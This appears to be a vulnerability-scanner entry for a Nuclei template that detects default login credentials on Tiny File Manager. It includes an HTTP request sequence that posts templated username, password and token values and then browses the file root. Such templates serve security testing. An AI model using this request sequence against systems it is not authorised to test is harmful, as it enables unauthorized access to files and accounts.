# Nuclei Template: Tiny File Manager - Default Login
**Template ID:** tiny-filemanager-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`tiny-file-manager-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Tiny File Manager contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

fm_usr={{user}}&fm_pwd={{pass}}&token={{token}}

GET /?p= HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/prasathmani/tinyfilemanager
- https://tinyfilemanager.github.io/docs/
